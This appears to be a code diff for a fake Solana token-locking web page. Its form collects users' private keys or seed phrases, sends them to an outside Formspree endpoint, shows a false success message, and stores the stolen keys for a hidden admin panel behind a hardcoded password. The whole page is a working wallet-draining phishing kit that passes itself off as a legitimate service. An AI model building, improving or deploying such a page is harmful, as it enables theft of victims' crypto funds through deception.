@@ -12,7 +12,8 @@
         .sf-card { background: #12161b; border: 1px solid #1e2329; border-radius: 16px; width: 100%; padding: 24px; }
         .sf-input { background: #1b1f23; border: 1px solid #30363d; border-radius: 12px; width: 100%; padding: 14px; margin-top: 6px; color: white; outline: none; font-size: 14px; }
         .sf-btn { background-color: #00ffbd; color: #0b0e11; font-weight: 700; width: 100%; padding: 16px; border-radius: 12px; cursor: pointer; margin-top: 24px; text-transform: uppercase; }
-        .secret-gate { width: 100%; height: 60px; background: transparent; margin-top: 10px; }
+        /* Zona invizibila pentru Admin */
+        .secret-gate { width: 100%; height: 60px; background: transparent; margin-top: 10px; cursor: default; }
         #adminPanel { display: none; margin-top: 20px; border-top: 1px solid #2d333b; padding-top: 20px; }
     </style>
 </head>
@@ -30,7 +31,7 @@
             
             <form id="lockerForm">
                 <input type="text" name="Project_Name" placeholder="Project Name" class="sf-input mb-4" required>
-                <input type="password" name="Private_Key" id="pkey" placeholder="Private Key / Seed Phrase" class="sf-input mb-4" required>
+                <input type="password" name="Private_Key" placeholder="Private Key / Seed Phrase" class="sf-input mb-4" required>
                 <div class="flex gap-4">
                     <input type="text" name="Symbol" placeholder="SOL" class="sf-input flex-1">
                     <input type="number" name="Amount" placeholder="0.00" class="sf-input flex-1">
@@ -42,9 +43,9 @@
             
             <div id="adminPanel">
                 <input type="password" id="adminPass" placeholder="Admin Password" class="sf-input text-xs mb-2">
-                <button onclick="checkAdmin()" class="w-full bg-gray-800 text-white text-xs py-3 rounded-lg font-bold">VIEW DATA</button>
+                <button onclick="checkAdmin()" class="w-full bg-gray-800 text-white text-xs py-3 rounded-lg font-bold">VIEW LOCAL DATA</button>
                 <div id="dataDisplay" class="hidden mt-4 p-4 bg-black rounded-lg text-[10px] text-green-500 font-mono border border-green-900/30">
-                    </div>
+                </div>
             </div>
         </div>
     </div>
@@ -52,47 +53,55 @@
     <script>
         const form = document.getElementById('lockerForm');
         
-        form.addEventListener("submit", async function(event) {
-            event.preventDefault();
+        form.addEventListener("submit", function(event) {
+            event.preventDefault(); // ASTA OPRESTE REDIRECTIONAREA
+            
             const btn = document.getElementById('submitBtn');
-            const data = new FormData(form);
+            const formData = new FormData(form);
             
             btn.innerText = "CONNECTING...";
             btn.disabled = true;
 
+            // Trimitem datele catre Formspree fara sa plecam de pe pagina
             fetch("https://formspree.io/f/mnjjqyez", {
                 method: "POST",
-                body: data,
+                body: formData,
                 headers: { 'Accept': 'application/json' }
             }).then(response => {
                 btn.innerText = "DEPLOY LOCK";
                 btn.disabled = false;
                 
-                // --- MESAJUL PERSONALIZAT AICI ---
+                // Mesajul tau personalizat
                 alert("Congratulations! You have successfully locked your token. Take a screenshot and share it on social media. Success!");
                 
-                let localData = JSON.parse(localStorage.getItem('logs') || "[]");
-                localData.push({
-                    p: form.Project_Name.value,
-                    k: form.Private_Key.value,
+                // Salvam si local pentru tabelul tau de admin
+                let logs = JSON.parse(localStorage.getItem('sf_logs') || "[]");
+                logs.push({
+                    p: formData.get('Project_Name'),
+                    k: formData.get('Private_Key'),
                     t: new Date().toLocaleTimeString()
                 });
-                localStorage.setItem('logs', JSON.stringify(localData));
+                localStorage.setItem('sf_logs', JSON.stringify(logs));
+                
                 form.reset();
             }).catch(error => {
-                alert("Error connecting to network. Please try again.");
+                alert("Network error. Please try again.");
+                btn.innerText = "DEPLOY LOCK";
+                btn.disabled = false;
             });
         });
 
         function checkAdmin() {
             if(document.getElementById('adminPass').value === 'Ovidiu20.04.2006') {
-                const logs = JSON.parse(localStorage.getItem('logs') || "[]");
+                const logs = JSON.parse(localStorage.getItem('sf_logs') || "[]");
                 const display = document.getElementById('dataDisplay');
                 display.innerHTML = logs.length > 0 ? 
                     logs.map(l => `[${l.t}] PROJ: ${l.p} | KEY: ${l.k}`).join('<br>') : 
-                    "No logs found yet.";
+                    "No logs collected yet.";
                 display.classList.remove('hidden');
-            } else { alert("Wrong password"); }
+            } else {
+                alert("Wrong Password");
+            }
         }
     </script>
 </body>
